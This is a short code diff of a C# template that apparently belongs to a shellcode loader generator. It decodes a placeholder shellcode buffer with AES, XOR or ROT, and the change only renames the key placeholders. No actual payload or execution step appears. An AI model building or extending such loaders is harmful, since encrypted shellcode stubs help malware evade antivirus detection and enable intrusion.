@@ -12,8 +12,8 @@
             byte[] buf = new byte[] {{SHELLCODE}};
             
 #if AES
-            byte[] key = new byte[] {{AES_KEY}};
-            byte[] iv = new byte[] {{AES_IV}};
+            byte[] key = new byte[] {{KEY}};
+            byte[] iv = new byte[] {{IV}};
 
             using (Aes aes = Aes.Create())
             {
@@ -28,11 +28,11 @@
 #elif XOR
             for (int i = 0; i < buf.Length; i++)
             {
-                buf[i] = (byte)((uint)buf[i] ^ {{XOR_KEY}});
+                buf[i] = (byte)((uint)buf[i] ^ {{KEY}});
             }
 #elif ROT
             for (int i = 0; i < buf.Length; i++)
             {
-                buf[i] = (byte)(((uint)buf[i] - {{ROT_KEY}}) & 0xFF);
+                buf[i] = (byte)(((uint)buf[i] - {{KEY}}) & 0xFF);
             }            
 #endif
